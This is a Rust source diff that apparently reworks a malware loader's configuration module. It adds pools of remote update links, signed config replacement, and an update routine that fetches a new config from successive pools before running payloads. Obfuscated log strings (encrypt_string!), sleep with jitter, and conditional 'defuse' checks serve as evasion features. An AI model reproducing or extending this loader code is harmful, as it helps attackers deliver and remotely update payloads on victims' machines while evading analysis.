@@ -1,6 +1,6 @@
 use crate::defuse::{Defuse, Operator};
-use crate::link::Link;
 use crate::payload::Payload;
+use crate::poollink::PoolLinks;
 use chksum_sha2_512 as sha2_512;
 use rand::Rng;
 use ring::signature::Ed25519KeyPair;
@@ -12,70 +12,85 @@ use std::{thread, time};
 
 use log::debug;
 use log::info;
+use log::warn;
 
 use cryptify::encrypt_string;
 
+use chrono::prelude::*;
+use std::collections::BTreeMap;
+//#use chrono::serde::ts_seconds_option;
+//    #[serde(with = "ts_seconds_option")]
+
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct LoaderConf {
-    pub loaderconf_update_links: Vec<Link>,
+pub struct SignMaterial {
+    pub peer_public_key_bytes: Vec<u8>,
+    pub sign_bytes: Vec<u8>,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct Config {
+    pub update_links: BTreeMap<u64, (String, PoolLinks)>,
     pub payloads: Vec<Payload>,
     pub defuse_update: Vec<Defuse>,
     pub defuse_payload: Vec<Defuse>,
     pub sign_material: SignMaterial,
     pub sleep: u64,
     pub jitt: u64,
+    pub date: DateTime<Utc>,
 }
 #[allow(dead_code)]
-impl LoaderConf {
+impl Config {
     pub fn new_unsigned(
-        loader_update_links: Vec<Link>,
+        update_links: BTreeMap<u64, (String, PoolLinks)>,
         payloads: Vec<Payload>,
         defuse_update: Vec<Defuse>,
         defuse_payload: Vec<Defuse>,
         sleep: u64,
         jitt: u64,
-    ) -> LoaderConf {
+    ) -> Config {
         let sign_material = SignMaterial {
             peer_public_key_bytes: vec![],
             sign_bytes: vec![],
         };
-        LoaderConf {
-            loaderconf_update_links: loader_update_links,
+        Config {
+            update_links: update_links,
             sign_material: sign_material,
             payloads: payloads,
             defuse_update: defuse_update,
             defuse_payload: defuse_payload,
             sleep: sleep,
             jitt: jitt,
+            date: Utc::now(),
         }
     }
-    pub fn new_empty() -> LoaderConf {
+    pub fn new_empty() -> Config {
         let sign_material = SignMaterial {
             peer_public_key_bytes: vec![],
             sign_bytes: vec![],
         };
-        LoaderConf {
-            loaderconf_update_links: vec![],
+        Config {
+            update_links: BTreeMap::new(),
             sign_material: sign_material,
             payloads: vec![],
             defuse_update: vec![],
             defuse_payload: vec![],
             sleep: 0,
             jitt: 0,
+            date: Utc::now(),
         }
     }
 
     pub fn new_signed(
         key_pair: &Ed25519KeyPair,
-        loader_update_links: Vec<Link>,
+        update_links: BTreeMap<u64, (String, PoolLinks)>,
         payloads: Vec<Payload>,
         defuse_update: Vec<Defuse>,
         defuse_payload: Vec<Defuse>,
         sleep: u64,
         jitt: u64,
-    ) -> LoaderConf {
-        let mut new_loader = LoaderConf::new_unsigned(
-            loader_update_links,
+    ) -> Config {
+        let mut new_loader = Config::new_unsigned(
+            update_links,
             payloads,
             defuse_update,
             defuse_payload,
@@ -108,7 +123,7 @@ impl LoaderConf {
 
     pub fn verify_newloader_sign(
         &self,
-        otherloader: &LoaderConf,
+        otherloader: &Config,
     ) -> Result<(), ring::error::Unspecified> {
         let sign_data = otherloader.return_sign_data();
         let peer_public_key = signature::UnparsedPublicKey::new(
@@ -118,10 +133,10 @@ impl LoaderConf {
         peer_public_key.verify(sign_data.as_bytes(), &otherloader.sign_material.sign_bytes)
     }
 
-    pub fn new_fromfile(path_file: &str) -> LoaderConf {
+    pub fn new_fromfile(path_file: &str) -> Config {
         let loader_bytes: Vec<u8> = fs::read(path_file).unwrap();
         let l = std::str::from_utf8(&loader_bytes).unwrap();
-        let loader: LoaderConf = serde_json::from_str(l).unwrap();
+        let loader: Config = serde_json::from_str(l).unwrap();
         loader
     }
 
@@ -129,11 +144,11 @@ impl LoaderConf {
         debug!("{:#?}", self);
     }
     pub fn print_loader_compact(&self) {
-        debug!("print_loader_compact");
+        debug!("{}",encrypt_string!("print_loader_compact"));
         debug!("{:?}", self);
     }
     pub fn get_loader_without_sign_material(&self) -> String {
-        let mut print_loader: LoaderConf = self.clone();
+        let mut print_loader: Config = self.clone();
         let clean_sign_material = SignMaterial {
             peer_public_key_bytes: vec![],
             sign_bytes: vec![],
@@ -168,12 +183,12 @@ impl LoaderConf {
         let digest = sha2_512::chksum(data).unwrap();
         digest.to_hex_lowercase()
     }
-    pub fn is_same_loader_hash(&self, otherloader: &LoaderConf) -> bool {
+    pub fn is_same_loader_hash(&self, otherloader: &Config) -> bool {
         let loader_hash = self.calculate_loader_hash();
         let otherloader_hash = otherloader.calculate_loader_hash();
         loader_hash == otherloader_hash
     }
-    pub fn is_same_loader(&self, otherloader: &LoaderConf) -> bool {
+    pub fn is_same_loader(&self, otherloader: &Config) -> bool {
         let loader_serialized = self.concat_loader_jsondata();
         let otherloader_serialized = otherloader.concat_loader_jsondata();
         loader_serialized == otherloader_serialized
@@ -218,8 +233,8 @@ impl LoaderConf {
                     }
                 } else {
                     match defuse.get_operator() {
-                        Operator::AND => {},
-                        Operator::OR => check_this_defuse = false
+                        Operator::AND => {}
+                        Operator::OR => check_this_defuse = false,
                     }
                 }
             } else {
@@ -242,10 +257,67 @@ impl LoaderConf {
         let sleep_time: time::Duration = time::Duration::from_millis((total_sleep * 1000.0) as u64);
         thread::sleep(sleep_time);
     }
-}
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct SignMaterial {
-    pub peer_public_key_bytes: Vec<u8>,
-    pub sign_bytes: Vec<u8>,
+    // try to fetch a new config, if no config are found return self. if no config is return from pool, need to try the next pool
+    pub fn update_config(&self) -> Config {
+        let mut pool_nb: i32 = 0;
+        for (_pool_nb, (pool_name, pool_links)) in &self.update_links {
+            pool_nb = pool_nb + 1;
+            info!(
+                "{}/{}{}{}",
+                pool_nb,
+                &self.update_links.len(),
+                encrypt_string!(" PoolLinks: "),
+                &pool_name
+            );
+            match pool_links.update_pool(&self) {
+                Ok(newconf) => {
+                    if self.is_same_loader(&newconf) {
+                        info!(
+                            "{}",
+                            encrypt_string!(
+                                "[+] the new config is identical to the current config"
+                            )
+                        );
+                        info!(
+                            "{}",
+                            encrypt_string!(
+                                "[+] DECISION: keep the same active CONFIG, and run the payloads"
+                            )
+                        );
+                    } else {
+                        info!(
+                            "{}",
+                            encrypt_string!("the new config is different from the current config")
+                        );
+                        info!(
+                            "{}",
+                            encrypt_string!(
+                                "[+] DECISION: replace the active CONFIG, and run the payloads"
+                            )
+                        );
+                    }
+
+                    return newconf;
+                }
+                Err(error) => {
+                    warn!(
+                        "{}{}",
+                        encrypt_string!("[+] Switch to next PoolLinks, reason: "),
+                        error
+                    );
+                    ()
+                }
+            };
+        }
+        warn!(
+            "{}",
+            encrypt_string!("[+] All PoolLinks fetch without finding a new fresh VALID config")
+        );
+        info!(
+            "{}",
+            encrypt_string!("[+] DECISION: keep the same active CONFIG, and run the payloads")
+        );
+        self.to_owned()
+    }
 }
